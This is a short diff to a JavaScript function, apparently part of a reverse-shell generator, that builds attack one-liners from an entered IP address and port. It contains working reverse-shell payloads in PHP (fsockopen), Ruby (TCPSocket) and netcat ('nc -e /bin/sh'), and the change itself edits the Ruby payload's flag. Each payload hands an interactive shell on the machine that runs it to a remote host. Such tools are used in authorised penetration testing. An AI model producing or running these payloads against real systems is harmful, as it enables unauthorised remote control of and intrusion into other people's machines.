@@ -34,7 +34,7 @@ function getShell() {
               payload = `php -r '$sock=fsockopen("${ip_arg}",${port_arg});exec("/bin/sh -i <&3 >&3 2>&3");'`;
               break;
             case "option4":
-              payload = `ruby -rsocket -e'f=TCPSocket.open("${ip_arg}",${port_arg}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
+              payload = `ruby -r socket -e'f=TCPSocket.open("${ip_arg}",${port_arg}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
               break;
             case "option6":
               payload = `nc -e /bin/sh ${ip_arg} ${port_arg}`;
